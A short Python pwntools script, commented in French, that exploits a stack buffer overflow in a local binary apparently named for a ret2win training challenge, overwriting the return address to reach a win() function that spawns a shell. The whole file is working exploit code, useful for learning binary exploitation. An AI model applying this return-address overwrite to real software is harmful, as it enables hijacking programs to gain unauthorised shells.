#!/usr/bin/env python3
"""
Exploit ret2win classique
Le programme lit 100 bytes dans un buffer de 32 bytes → Buffer overflow

Layout de la stack :
rbp-0x20: buffer[32 bytes]
rbp:      saved rbp (8 bytes)
rbp+8:    return address (8 bytes) ← à écraser avec win()

Fonction win() à 0x401146 qui exécute execve("/bin/sh", NULL, NULL)
"""

from pwn import *

# Configuration
binary = './ret2win'
p = process(binary)

# Adresse de la fonction win
win_addr = 0x401146

# Construction du payload
# Buffer (32 bytes) + saved rbp (8 bytes) + return address (8 bytes)
payload = b'A' * 32                    # Remplir le buffer
payload += b'B' * 8                    # Saved RBP (peut être n'importe quoi)
payload += p64(win_addr)               # Return address vers win()

print(f"[+] Payload length: {len(payload)} bytes")
print(f"[+] Win function address: 0x{win_addr:x}")
print(f"[+] Sending payload to get shell...")

# Envoyer le payload
p.sendline(payload)

# Passer en mode interactif pour utiliser le shell
p.interactive()